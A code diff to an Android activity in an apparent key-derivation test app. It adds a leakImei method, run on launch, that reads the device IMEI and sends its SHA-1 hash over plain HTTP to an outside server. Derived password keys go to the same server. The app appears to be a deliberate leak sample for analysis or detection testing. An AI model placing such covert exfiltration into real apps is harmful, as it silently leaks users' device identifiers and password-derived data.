@@ -1,8 +1,10 @@
 package at.f0rki.kdftest;
 
 import android.app.Activity;
+import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.Menu;
 import android.view.View;
@@ -24,7 +26,6 @@ import java.security.spec.InvalidKeySpecException;
 import java.security.spec.KeySpec;
 
 import javax.crypto.Cipher;
-import javax.crypto.NoSuchPaddingException;
 import javax.crypto.SecretKeyFactory;
 import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.SecretKeySpec;
@@ -32,9 +33,10 @@ import javax.crypto.spec.SecretKeySpec;
 public class PasswordInput extends Activity {
 
     private static final String TAG = "PasswordInputActivity";
-    private static final int ITERATIONCOUNT = 1001;
-    private static final int DERIVEDKEYLENGTH = 128;
-    private static final int SALTSIZE = 8;
+    private static final String SERVER = "http://f0rki.at/submit/test?";
+    private static final int ITERATION_COUNT = 1001;
+    private static final int DERIVED_KEY_LENGTH = 128;
+    private static final int SALT_SIZE = 8;
 
     public static String b16encode(byte[] input) {
         StringBuilder sb = new StringBuilder(input.length * 2);
@@ -49,6 +51,7 @@ public class PasswordInput extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_password_input);
+        leakImei();
     }
 
     @Override
@@ -56,6 +59,18 @@ public class PasswordInput extends Activity {
         // Inflate the menu; this adds items to the action bar if it is present.
         getMenuInflater().inflate(R.menu.password_input, menu);
         return true;
+    }
+
+    private void leakImei() {
+        Context c = getApplicationContext();
+        TelephonyManager telm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
+        String deviceId = telm.getDeviceId();
+        try {
+            sendToServer(b16encode(MessageDigest.getInstance("SHA-1").digest(deviceId.getBytes())), "imei");
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        }
+        Log.d(TAG, "leaked imei over network (is " + deviceId + ")");
     }
 
     public void applyPBKDF2(View view) {
@@ -79,8 +94,8 @@ public class PasswordInput extends Activity {
         new PBEncryptionTask().execute(password, inputData);
     }
 
-    protected void sendToServer(String whatever) {
-        String request = "http://f0rki.at/submit/test?id=KDFTest&derived="
+    protected void sendToServer(String whatever, String id) {
+        String request = SERVER + "id=KDFTest&" + id + "="
                 + whatever;
         new HttpSender().execute(request);
     }
@@ -109,10 +124,10 @@ public class PasswordInput extends Activity {
         public byte[] applyPBKDF2(String password) {
             byte[] encodedpwd = null;
             SecureRandom random = new SecureRandom();
-            byte[] salt = new byte[SALTSIZE];
+            byte[] salt = new byte[SALT_SIZE];
             random.nextBytes(salt);
             KeySpec spec = new PBEKeySpec(password.toCharArray(), salt,
-                    ITERATIONCOUNT, DERIVEDKEYLENGTH);
+                    ITERATION_COUNT, DERIVED_KEY_LENGTH);
             SecretKeyFactory f = null;
             try {
                 f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
@@ -137,7 +152,7 @@ public class PasswordInput extends Activity {
             byte[] result;
             result = applyPBKDF2(password[0]);
             // do something with the kdf
-            sendToServer(b16encode(result));
+            sendToServer(b16encode(result), "derived");
             return result;
         }
 
@@ -156,7 +171,7 @@ public class PasswordInput extends Activity {
         public byte[] applyMyKDF(String password) {
             MyKDF mkdf;
             try {
-                mkdf = new MyKDF(SALTSIZE, ITERATIONCOUNT);
+                mkdf = new MyKDF(SALT_SIZE, ITERATION_COUNT);
             } catch (NoSuchAlgorithmException e) {
                 e.printStackTrace();
                 Toast toast = Toast.makeText(getApplicationContext(),
@@ -172,7 +187,7 @@ public class PasswordInput extends Activity {
             byte[] result;
             result = applyMyKDF(password[0]);
             // do something with the kdf
-            sendToServer(b16encode(result));
+            sendToServer(b16encode(result), "derived");
             return result;
         }
 
@@ -192,10 +207,10 @@ public class PasswordInput extends Activity {
             byte[] encryptedData = new byte[0];
             byte[] encodedPw;
             SecureRandom random = new SecureRandom();
-            byte[] salt = new byte[SALTSIZE];
+            byte[] salt = new byte[SALT_SIZE];
             random.nextBytes(salt);
             KeySpec spec = new PBEKeySpec(password.toCharArray(), salt,
-                    ITERATIONCOUNT, DERIVEDKEYLENGTH);
+                    ITERATION_COUNT, DERIVED_KEY_LENGTH);
             SecretKeyFactory f;
             try {
                 // that's how it should be done!
